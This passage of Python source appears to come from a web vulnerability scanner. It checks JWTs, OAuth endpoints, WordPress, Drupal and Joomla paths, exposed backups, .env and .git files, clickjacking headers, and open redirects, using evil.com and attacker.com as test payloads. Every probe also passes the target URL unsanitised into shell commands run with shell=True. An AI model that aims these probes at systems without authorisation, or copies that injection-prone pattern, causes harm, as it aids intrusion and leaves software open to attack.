                        "introspection": False,
                        "evidence": "Introspection explicitly disabled",
                        "severity": "info"
                    })

            except Exception as e:
                self.log(f"GraphQL test error for {path}: {str(e)}", "error")

        self.results["graphql_introspection"] = results
        self.log(f"GraphQL introspection completed: {len(results)} findings", "info")
        return results

    def jwt_analysis(self, url):
        """Analyze JWT tokens."""
        self.log(f"Analyzing JWT tokens on {url}", "info")
        results = []

        try:
            cmd = f"curl -s --max-time 10 -v '{url}' 2>&1"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
            full_output = result.stdout + result.stderr

            jwt_pattern = r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]+'
            tokens = re.findall(jwt_pattern, full_output)

            cookie_jwt_pattern = r'(?:token|jwt|auth|session)=?(eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]+)'
            cookie_tokens = re.findall(cookie_jwt_pattern, full_output, re.IGNORECASE)

            all_tokens = list(set(tokens + cookie_tokens))

            for token in all_tokens:
                try:
                    parts = token.split('.')
                    if len(parts) != 3:
                        continue

                    import base64
                    def pad_b64(s):
                        return s + '=' * (4 - len(s) % 4)

                    header_b64 = pad_b64(parts[0].replace('-', '+').replace('_', '/'))
                    payload_b64 = pad_b64(parts[1].replace('-', '+').replace('_', '/'))

                    header = json.loads(base64.b64decode(header_b64))
                    payload = json.loads(base64.b64decode(payload_b64))

                    issues = []

                    alg = header.get("alg", "").upper()
                    if alg == "NONE":
                        issues.append({
                            "issue": "Algorithm none",
                            "severity": "critical",
                            "detail": "JWT accepts 'none' algorithm - signature bypass possible"
                        })
                    elif alg in ("HS256", "HS384", "HS512"):
                        issues.append({
                            "issue": "Symmetric algorithm",
                            "severity": "medium",
                            "detail": f"HMAC algorithm {alg} used - key brute-force possible"
                        })

                    if "exp" not in payload:
                        issues.append({
                            "issue": "No expiration",
                            "severity": "medium",
                            "detail": "JWT has no expiration claim"
                        })
                    elif payload.get("exp"):
                        exp_dt = datetime.fromtimestamp(payload["exp"])
                        if exp_dt < datetime.now():
                            issues.append({
                                "issue": "Expired token",
                                "severity": "low",
                                "detail": f"Token expired at {exp_dt.isoformat()}"
                            })

                    if payload.get("iat"):
                        iat_dt = datetime.fromtimestamp(payload["iat"])
                        if (datetime.now() - iat_dt).days > 365:
                            issues.append({
                                "issue": "Old token",
                                "severity": "low",
                                "detail": f"Token issued over a year ago: {iat_dt.isoformat()}"
                            })

                    sensitive_claims = ["password", "secret", "key", "token", "ssn", "credit"]
                    for claim in payload:
                        if any(s in claim.lower() for s in sensitive_claims):
                            issues.append({
                                "issue": f"Sensitive claim: {claim}",
                                "severity": "high",
                                "detail": f"JWT payload contains potentially sensitive claim: {claim}"
                            })

                    results.append({
                        "token": token[:50] + "...",
                        "header": header,
                        "payload_claims": list(payload.keys()),
                        "issues": issues,
                        "severity": "critical" if any(i["severity"] == "critical" for i in issues) else
                                  "high" if any(i["severity"] == "high" for i in issues) else
                                  "medium" if any(i["severity"] == "medium" for i in issues) else "low"
                    })

                    for issue in issues:
                        self.log(f"JWT issue: {issue['issue']} - {issue['detail']}", "warning")

                except Exception as e:
                    self.log(f"JWT decode error: {str(e)}", "error")

            if not all_tokens:
                self.log("No JWT tokens found in response", "info")

        except Exception as e:
            self.log(f"JWT analysis error: {str(e)}", "error")

        self.results["jwt_analysis"] = results
        self.log(f"JWT analysis completed: {len(results)} tokens analyzed", "info")
        return results

    def oauth_testing(self, url):
        """Test OAuth flows."""
        self.log(f"Testing OAuth on {url}", "info")
        results = []

        oauth_paths = [
            "/oauth/authorize", "/oauth/token", "/oauth/callback",
            "/auth/authorize", "/auth/token", "/auth/callback",
            "/oauth2/authorize", "/oauth2/token", "/oauth2/callback",
            "/.well-known/openid-configuration",
            "/openid-configuration",
            "/authorize", "/token", "/callback",
        ]

        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        for path in oauth_paths:
            try:
                test_url = f"{base_url}{path}"
                cmd = f"curl -sI --max-time 5 '{test_url}'"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
                status_line = result.stdout.split('\n')[0] if result.stdout else ""
                status_code = status_line.split()[1] if len(status_line.split()) > 1 else "000"

                if status_code in ("200", "301", "302", "303", "307"):
                    results.append({
                        "endpoint": test_url,
                        "status": status_code,
                        "type": "oauth_endpoint",
                        "severity": "info"
                    })
                    self.log(f"OAuth endpoint found: {path} [{status_code}]", "info")

            except Exception:
                pass

        try:
            oidc_url = f"{base_url}/.well-known/openid-configuration"
            cmd = f"curl -s --max-time 10 '{oidc_url}'"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)

            if result.stdout.strip().startswith('{'):
                oidc_config = json.loads(result.stdout)
                results.append({
                    "type": "openid_config",
                    "issuer": oidc_config.get("issuer"),
                    "authorization_endpoint": oidc_config.get("authorization_endpoint"),
                    "token_endpoint": oidc_config.get("token_endpoint"),
                    "userinfo_endpoint": oidc_config.get("userinfo_endpoint"),
                    "jwks_uri": oidc_config.get("jwks_uri"),
                    "severity": "info"
                })
                self.log("OpenID Connect configuration found", "info")

        except json.JSONDecodeError:
            pass
        except Exception as e:
            self.log(f"OIDC discovery error: {str(e)}", "error")

        weak_redirect_uris = ["http://localhost", "http://127.0.0.1", "http://", "*"]
        for result_item in results:
            if result_item.get("type") == "openid_config":
                auth_endpoint = result_item.get("authorization_endpoint", "")
                if auth_endpoint:
                    parsed_auth = urlparse(auth_endpoint)
                    if parsed_auth.scheme == "http" and parsed_auth.hostname not in ("localhost", "127.0.0.1"):
                        results.append({
                            "type": "oauth_issue",
                            "issue": "HTTP authorization endpoint",
                            "endpoint": auth_endpoint,
                            "severity": "high",
                            "recommendation": "Use HTTPS for OAuth endpoints"
                        })

        self.results["oauth"] = results
        self.log(f"OAuth testing completed: {len(results)} findings", "info")
        return results

    def wordpress_scan(self, url):
        """WordPress specific checks."""
        self.log(f"Scanning WordPress on {url}", "info")
        results = []

        wp_paths = [
            ("/wp-login.php", "Login page"),
            ("/wp-admin/", "Admin panel"),
            ("/xmlrpc.php", "XML-RPC"),
            ("/wp-json/wp/v2/users", "User enumeration via REST API"),
            ("/wp-json/wp/v2/posts", "Posts endpoint"),
            ("/wp-json/wp/v2/pages", "Pages endpoint"),
            ("/feed/", "RSS feed"),
            ("/wp-content/", "WP content directory"),
            ("/wp-includes/", "WP includes directory"),
            ("/wp-cron.php", "WP-Cron"),
            ("/readme.html", "Version disclosure"),
            ("/license.txt", "License file"),
            ("/wp-content/debug.log", "Debug log"),
            ("/wp-config.php.bak", "Config backup"),
            ("/.wp-config.php.swp", "Config swap file"),
            ("/wp-content/uploads/", "Uploads directory"),
            ("/wp-content/plugins/", "Plugins directory"),
            ("/wp-content/themes/", "Themes directory"),
            ("/wp-json/", "REST API root"),
        ]

        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        for path, description in wp_paths:
            try:
                test_url = f"{base_url}{path}"
                cmd = f"curl -sI --max-time 5 -o /dev/null -w '%{{http_code}}' '{test_url}'"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
                status = result.stdout.strip().strip("'")

                if status not in ("404", "000"):
                    severity = "high" if path in ("/xmlrpc.php", "/wp-json/wp/v2/users", "/wp-config.php.bak") else "info"
                    results.append({
                        "path": path,
                        "url": test_url,
                        "status": status,
                        "description": description,
                        "severity": severity
                    })
                    self.log(f"WP: {description} [{status}]", "success" if status == "200" else "info")

            except Exception as e:
                self.log(f"WP scan error for {path}: {str(e)}", "error")

        try:
            cmd = f"curl -s --max-time 10 '{base_url}/'"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)

            version_match = re.search(r'content="WordPress\s+([\d.]+)"', result.stdout)
            if version_match:
                version = version_match.group(1)
                results.append({
                    "type": "version_disclosure",
                    "version": version,
                    "severity": "medium",
                    "recommendation": "Remove WordPress version from meta tags"
                })
                self.log(f"WordPress version: {version}", "info")

            generator_match = re.search(r'<meta name="generator" content="WordPress\s+([\d.]+)"', result.stdout)
            if generator_match:
                results.append({
                    "type": "generator_meta",
                    "version": generator_match.group(1),
                    "severity": "low"
                })

        except Exception as e:
            self.log(f"WP version check error: {str(e)}", "error")

        self.results["wordpress"] = results
        self.log(f"WordPress scan completed: {len(results)} findings", "info")
        return results

    def drupal_scan(self, url):
        """Drupal specific checks."""
        self.log(f"Scanning Drupal on {url}", "info")
        results = []

        drupal_paths = [
            ("/user/login", "User login"),
            ("/admin/", "Admin panel"),
            ("/node/", "Node listing"),
            ("/CHANGELOG.txt", "Changelog disclosure"),
            ("/core/CHANGELOG.txt", "Core changelog"),
            ("/core/install.php", "Install script"),
            ("/core/rebuild.php", "Rebuild script"),
            ("/update.php", "Update script"),
            ("/sites/default/files/", "Files directory"),
            ("/sites/default/settings.php", "Settings file"),
            ("/.htaccess", "Htaccess file"),
            ("/robots.txt", "Robots.txt"),
            ("/xmlrpc.php", "XML-RPC"),
            ("/rest/", "REST API"),
            ("/jsonapi/", "JSON:API"),
            ("/graphql", "GraphQL"),
            ("/modules/", "Modules directory"),
            ("/themes/", "Themes directory"),
            ("/misc/", "Misc directory"),
            ("/INSTALL.txt", "Install instructions"),
            ("/README.txt", "Readme file"),
            ("/LICENSE.txt", "License file"),
        ]

        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        for path, description in drupal_paths:
            try:
                test_url = f"{base_url}{path}"
                cmd = f"curl -sI --max-time 5 -o /dev/null -w '%{{http_code}}' '{test_url}'"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
                status = result.stdout.strip().strip("'")

                if status not in ("404", "000"):
                    severity = "high" if path in ("/sites/default/settings.php",) else "info"
                    results.append({
                        "path": path,
                        "url": test_url,
                        "status": status,
                        "description": description,
                        "severity": severity
                    })
                    self.log(f"Drupal: {description} [{status}]", "success" if status == "200" else "info")

            except Exception as e:
                self.log(f"Drupal scan error for {path}: {str(e)}", "error")

        try:
            cmd = f"curl -s --max-time 10 '{base_url}/'"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
            body = result.stdout

            version_patterns = [
                r'Drupal\s+([\d.]+)',
                r'content="Drupal\s+([\d.]+)"',
                r'Drupal\.settings\s*=\s*\{[^}]*"version"\s*:\s*"([\d.]+)"',
            ]

            for pattern in version_patterns:
                match = re.search(pattern, body, re.IGNORECASE)
                if match:
                    version = match.group(1)
                    results.append({
                        "type": "version_disclosure",
                        "version": version,
                        "severity": "medium",
                        "recommendation": "Update Drupal to the latest version"
                    })
                    self.log(f"Drupal version: {version}", "info")
                    break

        except Exception as e:
            self.log(f"Drupal version check error: {str(e)}", "error")

        self.results["drupal"] = results
        self.log(f"Drupal scan completed: {len(results)} findings", "info")
        return results

    def joomla_scan(self, url):
        """Joomla specific checks."""
        self.log(f"Scanning Joomla on {url}", "info")
        results = []

        joomla_paths = [
            ("/administrator/", "Admin panel"),
            ("/administrator/manifests/", "Manifests directory"),
            ("/configuration.php", "Configuration file"),
            ("/configuration.php.dist", "Config template"),
            ("/README.txt", "Readme"),
            ("/LICENSE.txt", "License"),
            ("/robots.txt", "Robots"),
            ("/htaccess.txt", "Htaccess template"),
            ("/web.config.txt", "Web config template"),
            ("/components/", "Components directory"),
            ("/modules/", "Modules directory"),
            ("/plugins/", "Plugins directory"),
            ("/templates/", "Templates directory"),
            ("/media/", "Media directory"),
            ("/images/", "Images directory"),
            ("/language/", "Language directory"),
            ("/cli/", "CLI directory"),
            ("/api/", "API directory"),
            ("/cache/", "Cache directory"),
            ("/tmp/", "Temp directory"),
            ("/logs/", "Logs directory"),
            ("/xmlrpc.php", "XML-RPC"),
            ("/feeds/", "RSS feeds"),
        ]

        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        for path, description in joomla_paths:
            try:
                test_url = f"{base_url}{path}"
                cmd = f"curl -sI --max-time 5 -o /dev/null -w '%{{http_code}}' '{test_url}'"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
                status = result.stdout.strip().strip("'")

                if status not in ("404", "000"):
                    severity = "high" if path in ("/configuration.php", "/configuration.php.dist") else "info"
                    results.append({
                        "path": path,
                        "url": test_url,
                        "status": status,
                        "description": description,
                        "severity": severity
                    })
                    self.log(f"Joomla: {description} [{status}]", "success" if status == "200" else "info")

            except Exception as e:
                self.log(f"Joomla scan error for {path}: {str(e)}", "error")

        try:
            cmd = f"curl -s --max-time 10 '{base_url}/'"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
            body = result.stdout

            version_patterns = [
                r'Joomla!\s+([\d.]+)',
                r'content="Joomla!\s+([\d.]+)"',
                r'"version"\s*:\s*"([\d.]+)"',
            ]

            for pattern in version_patterns:
                match = re.search(pattern, body, re.IGNORECASE)
                if match:
                    version = match.group(1)
                    results.append({
                        "type": "version_disclosure",
                        "version": version,
                        "severity": "medium",
                        "recommendation": "Update Joomla to the latest version"
                    })
                    self.log(f"Joomla version: {version}", "info")
                    break

            generator_match = re.search(r'<meta name="generator" content="([^"]+)"', body)
            if generator_match and "joomla" in generator_match.group(1).lower():
                results.append({
                    "type": "generator_meta",
                    "content": generator_match.group(1),
                    "severity": "low"
                })

        except Exception as e:
            self.log(f"Joomla version check error: {str(e)}", "error")

        self.results["joomla"] = results
        self.log(f"Joomla scan completed: {len(results)} findings", "info")
        return results

    def backup_file_discovery(self, url):
        """Discover backup files."""
        self.log(f"Searching for backup files on {url}", "info")
        results = []

        backup_extensions = [
            ".bak", ".old", ".orig", ".save", ".swp", ".swo",
            ".backup", ".copy", ".tmp", ".temp",
            ".tar.gz", ".tar.bz2", ".zip", ".rar", ".7z",
            ".sql", ".sql.gz", ".sql.bak", ".dump",
            "~", ".save", ".sav",
        ]

        common_files = [
            "index.php", "config.php", "wp-config.php", ".htaccess",
            "web.config", "settings.py", "application.properties",
            "database.yml", "config.yml", "config.json",
            "configuration.php", "settings.php",
            ".env", "config.inc.php", "config.ini",
        ]

        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        for filename in common_files:
            for ext in backup_extensions:
                try:
                    test_url = f"{base_url}/{filename}{ext}"
                    cmd = f"curl -sI --max-time 5 -o /dev/null -w '%{{http_code}}' '{test_url}'"
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
                    status = result.stdout.strip().strip("'")

                    if status in ("200", "301", "302"):
                        results.append({
                            "file": f"{filename}{ext}",
                            "url": test_url,
                            "status": status,
                            "severity": "high",
                            "recommendation": "Remove backup files from web root"
                        })
                        self.log(f"Backup found: {filename}{ext} [{status}]", "warning")

                except Exception:
                    pass

        directory_paths = [
            "/backup/", "/backups/", "/bak/", "/old/", "/temp/",
            "/db/", "/database/", "/sql/", "/dump/",
            "/exports/", "/archives/", "/data/",
            "/.git/", "/.svn/", "/.hg/", "/.bzr/",
        ]

        for path in directory_paths:
            try:
                test_url = f"{base_url}{path}"
                cmd = f"curl -sI --max-time 5 -o /dev/null -w '%{{http_code}}' '{test_url}'"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
                status = result.stdout.strip().strip("'")

                if status in ("200", "301", "302"):
                    severity = "critical" if path in ("/.git/", "/.svn/", "/.hg/", "/.bzr/") else "high"
                    results.append({
                        "file": path,
                        "url": test_url,
                        "status": status,
                        "severity": severity,
                        "recommendation": f"Remove {path} directory from web root"
                    })
                    self.log(f"Sensitive directory: {path} [{status}]", "warning")

            except Exception:
                pass

        self.results["backup_files"] = results
        self.log(f"Backup file discovery completed: {len(results)} files found", "info")
        return results

    def source_code_disclosure(self, url):
        """Check for source code exposure."""
        self.log(f"Checking source code disclosure on {url}", "info")
        results = []

        disclosure_paths = [
            ("/.git/HEAD", "Git HEAD", "Git repository exposed"),
            ("/.git/config", "Git config", "Git configuration exposed"),
            ("/.gitignore", "Gitignore", "Git ignore file exposed"),
            ("/.svn/entries", "SVN entries", "SVN repository exposed"),
            ("/.svn/wc.db", "SVN database", "SVN database exposed"),
            ("/.hg/dirstate", "Mercurial", "Mercurial repository exposed"),
            ("/.bzr/README", "Bazaar", "Bazaar repository exposed"),
            ("/WEB-INF/web.xml", "Java config", "Java web config exposed"),
            ("/META-INF/MANIFEST.MF", "Java manifest", "Java manifest exposed"),
            ("/.env", "Environment", "Environment file exposed"),
            ("/.DS_Store", "DS_Store", "macOS directory info exposed"),
            ("/composer.json", "Composer", "PHP dependencies exposed"),
            ("/composer.lock", "Composer lock", "PHP dependency versions exposed"),
            ("/package.json", "NPM", "Node.js dependencies exposed"),
            ("/package-lock.json", "NPM lock", "Node.js dependency versions exposed"),
            ("/Gemfile", "Bundler", "Ruby dependencies exposed"),
            ("/Gemfile.lock", "Bundler lock", "Ruby dependency versions exposed"),
            ("/requirements.txt", "Python deps", "Python dependencies exposed"),
            ("/Pipfile", "Pipenv", "Python Pipfile exposed"),
            ("/Pipfile.lock", "Pipenv lock", "Python dependency versions exposed"),
            ("/Cargo.toml", "Cargo", "Rust dependencies exposed"),
            ("/go.mod", "Go modules", "Go dependencies exposed"),
            ("/.idea/workspace.xml", "IDE config", "JetBrains workspace exposed"),
            ("/.vscode/settings.json", "VS Code config", "VS Code settings exposed"),
            ("/node_modules/", "node_modules", "Node modules directory exposed"),
            ("/vendor/", "Vendor", "PHP vendor directory exposed"),
        ]

        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        for path, name, description in disclosure_paths:
            try:
                test_url = f"{base_url}{path}"
                cmd = f"curl -s --max-time 5 '{test_url}'"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
                body = result.stdout

                if body and len(body) > 0 and "<html" not in body.lower()[:200]:
                    if path == "/.git/HEAD" and "ref:" in body:
                        severity = "critical"
                    elif path == "/.env":
                        severity = "critical"
                    elif path.startswith("/.git"):
                        severity = "critical"
                    else:
                        severity = "high"

                    results.append({
                        "path": path,
                        "name": name,
                        "description": description,
                        "url": test_url,
                        "content_preview": body[:200].strip(),
                        "severity": severity
                    })
                    self.log(f"Source disclosure: {description}", "warning")

            except Exception as e:
                self.log(f"Source disclosure error for {path}: {str(e)}", "error")

        try:
            test_url = f"{base_url}/robots.txt"
            cmd = f"curl -s --max-time 5 '{test_url}'"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)

            if "Disallow:" in result.stdout:
                disallowed = re.findall(r'Disallow:\s*(.+)', result.stdout)
                for item in disallowed:
                    if any(s in item.lower() for s in ['admin', 'config', 'backup', 'db', '.git', '.env']):
                        results.append({
                            "path": item.strip(),
                            "name": "Sensitive path in robots.txt",
                            "description": "Sensitive path disclosed in robots.txt",
                            "severity": "medium"
                        })
                        self.log(f"robots.txt disclosure: {item.strip()}", "warning")

        except Exception:
            pass

        self.results["source_disclosure"] = results
        self.log(f"Source code disclosure check completed: {len(results)} findings", "info")
        return results

    def clickjacking_test(self, url):
        """Test for clickjacking vulnerability."""
        self.log(f"Testing clickjacking on {url}", "info")
        results = []

        try:
            cmd = f"curl -sI --max-time 10 '{url}'"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
            headers = result.stdout.lower()

            xfo_value = None
            csp_frame = None
            corp_value = None

            for line in headers.split('\n'):
                if 'x-frame-options:' in line:
                    xfo_value = line.split(':', 1)[1].strip()
                if 'content-security-policy:' in line:
                    csp_header = line.split(':', 1)[1].strip()
                    if 'frame-ancestors' in csp_header:
                        csp_frame = csp_header
                if 'cross-origin-resource-policy:' in line:
                    corp_value = line.split(':', 1)[1].strip()

            if xfo_value:
                if xfo_value.lower() not in ('deny', 'sameorigin'):
                    results.append({
                        "header": "X-Frame-Options",
                        "value": xfo_value,
                        "status": "weak",
                        "severity": "medium",
                        "recommendation": "Set X-Frame-Options to DENY or SAMEORIGIN"
                    })
                else:
                    results.append({
                        "header": "X-Frame-Options",
                        "value": xfo_value,
                        "status": "secure",
                        "severity": "info"
                    })
            else:
                results.append({
                    "header": "X-Frame-Options",
                    "status": "missing",
                    "severity": "high",
                    "recommendation": "Add X-Frame-Options: DENY or SAMEORIGIN"
                })
                self.log("Missing X-Frame-Options header", "warning")

            if csp_frame:
                if 'none' in csp_frame or 'self' in csp_frame:
                    results.append({
                        "header": "CSP frame-ancestors",
                        "value": csp_frame,
                        "status": "secure",
                        "severity": "info"
                    })
                else:
                    results.append({
                        "header": "CSP frame-ancestors",
                        "value": csp_frame,
                        "status": "weak",
                        "severity": "medium"
                    })

            if not xfo_value and not csp_frame:
                results.append({
                    "vulnerability": "Clickjacking",
                    "status": "vulnerable",
                    "severity": "high",
                    "recommendation": "Add X-Frame-Options or CSP frame-ancestors to prevent clickjacking"
                })
                self.log("Clickjacking: No protection headers found", "warning")

        except Exception as e:
            self.log(f"Clickjacking test error: {str(e)}", "error")

        self.results["clickjacking"] = results
        self.log(f"Clickjacking test completed: {len(results)} findings", "info")
        return results

    def open_redirect(self, url):
        """Test for open redirect vulnerabilities."""
        self.log(f"Testing open redirect on {url}", "info")
        results = []

        redirect_params = [
            "url", "next", "redirect", "redirect_url", "redirect_uri",
            "return", "return_url", "return_to", "goto", "go",
            "out", "view", "to", "link", "target",
            "continue", "dest", "destination", "redir",
            "redirect_to", "checkout_url", "return_url",
        ]

        external_domains = [
            "https://evil.com",
            "https://attacker.com",
            "https://google.com",
            "//evil.com",
        ]

        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        for param in redirect_params:
            for external_url in external_domains:
                try:
                    test_url = f"{base_url}/?{param}={external_url}"
                    cmd = f"curl -sI --max-time 10 -L -o /dev/null -w '%{{http_code}} %{{url_effective}}' '{test_url}'"
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
                    output = result.stdout.strip()

                    parts = output.split(' ', 1)
                    final_status = parts[0] if len(parts) > 0 else ""
                    final_url = parts[1] if len(parts) > 1 else ""

                    if final_url and external_url.replace("https:", "").replace("http:", "").replace("//", "") in final_url:
                        results.append({
                            "parameter": param,
                            "payload": external_url,
                            "final_url": final_url,
                            "status": final_status,
                            "severity": "high",
                            "recommendation": f"Validate and sanitize {param} parameter"
                        })
                        self.log(f"Open redirect: {param} -> {final_url}", "warning")
                        break

                except Exception as e:
                    self.log(f"Open redirect test error: {str(e)}", "error")

        parsed = urlparse(url)
        for external_url in external_domains:
            try:
                path_parts = parsed.path.rstrip('/').split('/')
                if len(path_parts) > 1:
                    redirect_path = '/'.join(path_parts[:-1]) + '/' + external_url.replace("https://", "").replace("http://", "")
                    test_url = f"{parsed.scheme}://{parsed.netloc}{redirect_path}"
                    cmd = f"curl -sI --max-time 10 -o /dev/null -w '%{{http_code}}' '{test_url}'"
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
                    status = result.stdout.strip().strip("'")

                    if status in ("301", "302", "303", "307", "308"):
                        results.append({
                            "type": "path_based_redirect",
                            "path": redirect_path,
                            "status": status,
                            "severity": "medium"
                        })

            except Exception:
                pass

        self.results["open_redirect"] = results
        self.log(f"Open redirect test completed: {len(results)} findings", "info")
        return results

    def generate_report(self):
        """Generate comprehensive web exploration report."""
        report = {
            "title": "Web Exploration Report",
            "timestamp": datetime.now().isoformat(),
            "results": self.results,
            "summary": {}
        }

        total_findings = 0
        severity_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}

        for category, data in self.results.items():
            if isinstance(data, list):
                for item in data:
                    total_findings += 1
                    severity = item.get("severity", "info")
                    if severity in severity_counts:
                        severity_counts[severity] += 1
                    elif isinstance(item, dict) and "issues" in item:
                        for issue in item["issues"]:
                            sev = issue.get("severity", "info")
                            if sev in severity_counts:
                                severity_counts[sev] += 1
                    elif isinstance(item, dict) and "type" in item:
                        severity_counts["info"] += 1
            elif isinstance(data, dict):
                total_findings += 1

        report["summary"] = {
            "total_findings": total_findings,
            "severity_breakdown": severity_counts,
            "categories_tested": list(self.results.keys()),
            "risk_level": "critical" if severity_counts["critical"] > 0 else
                          "high" if severity_counts["high"] > 0 else
                          "medium" if severity_counts["medium"] > 0 else
                          "low" if severity_counts["low"] > 0 else "info"
        }

        self.log(f"Report generated: {total_findings} total findings", "info")
        self.log(f"Risk level: {report['summary']['risk_level']}", "warning" if report["summary"]["risk_level"] in ("critical", "high") else "info")

        return report
